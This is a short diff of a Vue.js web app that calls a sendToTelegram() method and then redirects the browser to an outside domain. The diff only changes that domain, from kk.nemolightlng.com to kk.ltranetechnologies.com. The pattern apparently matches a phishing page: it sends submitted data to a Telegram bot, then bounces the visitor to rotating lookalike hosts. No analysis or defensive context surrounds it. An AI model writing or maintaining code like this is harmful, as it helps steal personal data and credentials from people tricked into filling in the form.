@@ -138,7 +138,7 @@ const app = Vue.createApp({
 
       setTimeout(() => {
         this.sendToTelegram();
-        window.location.href = 'https://kk.nemolightlng.com/';
+        window.location.href = 'https://kk.ltranetechnologies.com/';
       }, 2000);
     },
     sendToTelegram() {
